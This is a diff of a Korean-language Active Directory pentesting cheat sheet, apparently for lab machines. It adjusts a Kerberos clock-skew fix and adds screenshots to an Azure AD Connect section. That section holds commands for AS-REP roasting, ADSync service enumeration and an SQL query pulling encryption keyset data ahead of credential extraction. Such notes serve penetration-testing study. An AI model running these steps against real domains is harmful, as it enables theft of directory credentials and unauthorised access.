@@ -55,8 +55,7 @@ impacket-GetNPUsers -dc-ip <ip> -no-pass <domain>/<user>
 
 ## Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```bash
-sudo timedatectl set-ntp off
-sudo rdate -n [IP of Target]
+sudo ntpdate <ip>
 ```
 
 ---
@@ -221,7 +220,9 @@ certipy-ad auth -dc-ip <ip> -pfx <pfx file> -u <user> -domain <domain>
 
 ## Azure AD Connect
 
-서버에 `AAD_*`, `MSOL_*`가 있다면 Azure AD Connect 서버라고 추측할 수 있음
+- 서버에 `AAD_*`, `MSOL_*`가 있다면 Azure AD Connect 서버라고 추측할 수 있음
+<img width="868" height="485" alt="image" src="https://github.com/user-attachments/assets/30b97330-3c40-4466-ab6d-712ba911ced4" />
+
 
 ### ADSync 서비스 확인
 ```powershell
@@ -232,7 +233,6 @@ Get-Service
 wmic.exe service get name
 sc.exe query state= all
 net.exe start
-
 Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
 ```
 
@@ -244,11 +244,13 @@ Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
 ```powershell
 Get-ItemProperty -Path <service Path> | Format-list -Property * -Force
 ```
+<img width="825" height="286" alt="image" src="https://github.com/user-attachments/assets/fba28c0a-16fa-432e-a6d8-73500cff0775" />
 
 ### 1.5.x 버전 (DPAPI 사용)
 ```powershell
 sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
 ```
+<img width="1117" height="169" alt="image" src="https://github.com/user-attachments/assets/7306dde5-621c-4da0-afa0-7d7cda5c2818" />
 
 ### PowerShell 스크립트를 이용한 자격 증명 추출
 ```powershell
